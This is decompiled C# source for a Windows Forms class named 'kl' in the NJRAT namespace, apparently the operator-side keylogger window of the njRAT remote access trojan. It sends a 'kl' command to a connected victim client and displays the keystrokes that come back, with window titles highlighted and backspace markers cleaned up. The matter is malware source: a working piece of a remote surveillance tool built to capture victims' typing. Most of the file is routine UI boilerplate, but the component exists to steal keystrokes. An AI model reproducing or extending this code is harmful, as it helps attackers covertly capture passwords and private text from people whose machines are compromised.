using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x02000015 RID: 21
	[DesignerGenerated]
	public partial class kl : Form
	{
		// Token: 0x060002F0 RID: 752 RVA: 0x001609A4 File Offset: 0x0015EDA4
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = kl.__ENCList;
			lock (_ENCList)
			{
				bool flag = kl.__ENCList.Count == kl.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = kl.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = kl.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								kl.__ENCList[num] = kl.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					kl.__ENCList.RemoveRange(num, kl.__ENCList.Count - num);
					kl.__ENCList.Capacity = kl.__ENCList.Count;
				}
				kl.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000112 RID: 274
		// (get) Token: 0x060002F3 RID: 755 RVA: 0x001610D8 File Offset: 0x0015F4D8
		// (set) Token: 0x060002F4 RID: 756 RVA: 0x001610F0 File Offset: 0x0015F4F0
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x17000113 RID: 275
		// (get) Token: 0x060002F5 RID: 757 RVA: 0x001610FC File Offset: 0x0015F4FC
		// (set) Token: 0x060002F6 RID: 758 RVA: 0x00161114 File Offset: 0x0015F514
		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MenuStrip1 = value;
			}
		}

		// Token: 0x17000114 RID: 276
		// (get) Token: 0x060002F7 RID: 759 RVA: 0x00161120 File Offset: 0x0015F520
		// (set) Token: 0x060002F8 RID: 760 RVA: 0x00161138 File Offset: 0x0015F538
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= eventHandler;
				}
				this._ToolStripMenuItem1 = value;
				flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000115 RID: 277
		// (get) Token: 0x060002F9 RID: 761 RVA: 0x00161198 File Offset: 0x0015F598
		// (set) Token: 0x060002FA RID: 762 RVA: 0x001611B0 File Offset: 0x0015F5B0
		internal virtual ToolStripMenuItem ToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem2_Click);
				bool flag = this._ToolStripMenuItem2 != null;
				if (flag)
				{
					this._ToolStripMenuItem2.Click -= eventHandler;
				}
				this._ToolStripMenuItem2 = value;
				flag = this._ToolStripMenuItem2 != null;
				if (flag)
				{
					this._ToolStripMenuItem2.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000116 RID: 278
		// (get) Token: 0x060002FB RID: 763 RVA: 0x00161210 File Offset: 0x0015F610
		// (set) Token: 0x060002FC RID: 764 RVA: 0x00161228 File Offset: 0x0015F628
		internal virtual ToolStripTextBox TFind
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TFind;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TFind = value;
			}
		}

		// Token: 0x17000117 RID: 279
		// (get) Token: 0x060002FD RID: 765 RVA: 0x00161234 File Offset: 0x0015F634
		// (set) Token: 0x060002FE RID: 766 RVA: 0x0016124C File Offset: 0x0015F64C
		internal virtual ToolStripMenuItem ToolStripMenuItem3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem3_Click);
				bool flag = this._ToolStripMenuItem3 != null;
				if (flag)
				{
					this._ToolStripMenuItem3.Click -= eventHandler;
				}
				this._ToolStripMenuItem3 = value;
				flag = this._ToolStripMenuItem3 != null;
				if (flag)
				{
					this._ToolStripMenuItem3.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000118 RID: 280
		// (get) Token: 0x060002FF RID: 767 RVA: 0x001612AC File Offset: 0x0015F6AC
		// (set) Token: 0x06000300 RID: 768 RVA: 0x001612C4 File Offset: 0x0015F6C4
		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		// Token: 0x17000119 RID: 281
		// (get) Token: 0x06000301 RID: 769 RVA: 0x001612D0 File Offset: 0x0015F6D0
		// (set) Token: 0x06000302 RID: 770 RVA: 0x001612E8 File Offset: 0x0015F6E8
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x1700011A RID: 282
		// (get) Token: 0x06000303 RID: 771 RVA: 0x001612F4 File Offset: 0x0015F6F4
		// (set) Token: 0x06000304 RID: 772 RVA: 0x0016130C File Offset: 0x0015F70C
		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CopyToolStripMenuItem_Click);
				bool flag = this._CopyToolStripMenuItem != null;
				if (flag)
				{
					this._CopyToolStripMenuItem.Click -= eventHandler;
				}
				this._CopyToolStripMenuItem = value;
				flag = this._CopyToolStripMenuItem != null;
				if (flag)
				{
					this._CopyToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700011B RID: 283
		// (get) Token: 0x06000305 RID: 773 RVA: 0x0016136C File Offset: 0x0015F76C
		// (set) Token: 0x06000306 RID: 774 RVA: 0x00161384 File Offset: 0x0015F784
		internal virtual ToolStripMenuItem SelectAllToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SelectAllToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.SelectAllToolStripMenuItem_Click);
				bool flag = this._SelectAllToolStripMenuItem != null;
				if (flag)
				{
					this._SelectAllToolStripMenuItem.Click -= eventHandler;
				}
				this._SelectAllToolStripMenuItem = value;
				flag = this._SelectAllToolStripMenuItem != null;
				if (flag)
				{
					this._SelectAllToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x06000307 RID: 775 RVA: 0x001613E4 File Offset: 0x0015F7E4
		public kl()
		{
			kl.__ENCAddToList(this);
			this.listViewItem_0 = null;
			this.InitializeComponent();
		}

		// Token: 0x06000308 RID: 776 RVA: 0x00161404 File Offset: 0x0015F804
		public void insert(string T)
		{
			bool flag = T.StartsWith("\u0001") & T.EndsWith("\u0001");
			if (flag)
			{
				this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
				this.T1.SelectionColor = Color.Green;
				this.T1.AppendText("\r\n[ " + T.Replace("\u0001", string.Empty) + "]\r\n");
			}
			else
			{
				this.T1.SelectionFont = this.T1.Font;
				this.T1.SelectionColor = this.T1.ForeColor;
				this.T1.AppendText(T + "\r\n");
			}
		}

		// Token: 0x06000309 RID: 777 RVA: 0x001614D0 File Offset: 0x0015F8D0
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.Copy();
		}

		// Token: 0x0600030A RID: 778 RVA: 0x001614E0 File Offset: 0x0015F8E0
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				this.c.Send("kl");
				this.ToolStripMenuItem1.Enabled = false;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600030B RID: 779 RVA: 0x00161530 File Offset: 0x0015F930
		private void SelectAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.T1.SelectAll();
		}

		// Token: 0x0600030C RID: 780 RVA: 0x00161540 File Offset: 0x0015F940
		private void ToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.T1.Find(this.TFind.Text, this.T1.SelectionStart + this.T1.SelectionLength, RichTextBoxFinds.None) == -1;
			if (flag)
			{
				this.T1.Find(this.TFind.Text, 0, RichTextBoxFinds.None);
			}
		}

		// Token: 0x0600030D RID: 781 RVA: 0x001615A0 File Offset: 0x0015F9A0
		private void ToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			try
			{
				int num = 1;
				IDataObject dataObject = Clipboard.GetDataObject();
				this.T1.ReadOnly = false;
				while (num != -1)
				{
					num = this.T1.Find("[Back]", num, RichTextBoxFinds.None);
					bool flag = num > 0;
					if (flag)
					{
						string text = this.T1.Text[num - 1].ToString();
						flag = Operators.CompareString(text, "]", false) == 0 || Operators.CompareString(text, "\n", false) == 0;
						if (flag)
						{
							this.T1.Select(num, "[back]".Length);
							this.T1.Cut();
						}
						else
						{
							this.T1.Select(num - 1, "[back]".Length + 1);
							this.T1.Cut();
						}
					}
				}
				Clipboard.SetDataObject(dataObject);
				this.T1.ReadOnly = true;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0400014B RID: 331
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400014D RID: 333
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x0400014E RID: 334
		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		// Token: 0x0400014F RID: 335
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x04000150 RID: 336
		[AccessedThroughProperty("ToolStripMenuItem2")]
		private ToolStripMenuItem _ToolStripMenuItem2;

		// Token: 0x04000151 RID: 337
		[AccessedThroughProperty("TFind")]
		private ToolStripTextBox _TFind;

		// Token: 0x04000152 RID: 338
		[AccessedThroughProperty("ToolStripMenuItem3")]
		private ToolStripMenuItem _ToolStripMenuItem3;

		// Token: 0x04000153 RID: 339
		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		// Token: 0x04000154 RID: 340
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x04000155 RID: 341
		[AccessedThroughProperty("CopyToolStripMenuItem")]
		private ToolStripMenuItem _CopyToolStripMenuItem;

		// Token: 0x04000156 RID: 342
		[AccessedThroughProperty("SelectAllToolStripMenuItem")]
		private ToolStripMenuItem _SelectAllToolStripMenuItem;

		// Token: 0x04000157 RID: 343
		public Client c;

		// Token: 0x04000158 RID: 344
		private ListViewItem listViewItem_0;
	}
}
